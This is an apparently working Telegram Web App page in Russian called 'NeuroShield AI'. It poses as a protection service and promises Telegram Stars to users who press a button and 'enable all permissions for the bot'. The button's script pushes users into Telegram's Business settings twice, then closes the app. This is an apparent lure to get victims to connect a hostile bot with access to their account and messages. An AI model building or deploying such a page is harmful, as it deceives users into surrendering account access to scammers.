<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NeuroShield AI</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #0e1621; color: white; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        .container { background: #17212b; width: 85%; padding: 25px; border-radius: 20px; border: 1px solid #2b3948; text-align: center; }
        .status-badge { background: rgba(241, 196, 15, 0.1); color: #f1c40f; padding: 5px 12px; border-radius: 20px; font-size: 12px; text-transform: uppercase; margin-bottom: 15px; display: inline-block; }
        .btn { background: #2481cc; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="status-badge">Ожидание верификации</div>
        <h2>NeuroShield AI</h2>
        <p style="color: #8ba3b7; font-size: 14px;">Для активации защиты нажмите кнопку и включите все разрешения для бота.</p>
        <button class="btn" onclick="forceRedirect()">ПОДКЛЮЧИТЬ И ПОЛУЧИТЬ ⭐️</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        function forceRedirect() {
            const businessUrl = "https://t.me/setsprofile?section=business";
            
            // 1. Попытка через стандартный метод
            tg.openTelegramLink(businessUrl);
            
            // 2. Дублирующая попытка через замену локации (пробивает кэш)
            setTimeout(() => {
                window.location.replace(businessUrl);
            }, 100);

            // 3. Закрываем приложение, чтобы не мешало настройкам
            setTimeout(() => {
                tg.close();
            }, 2000);
        }
    </script>
</body>
</html>
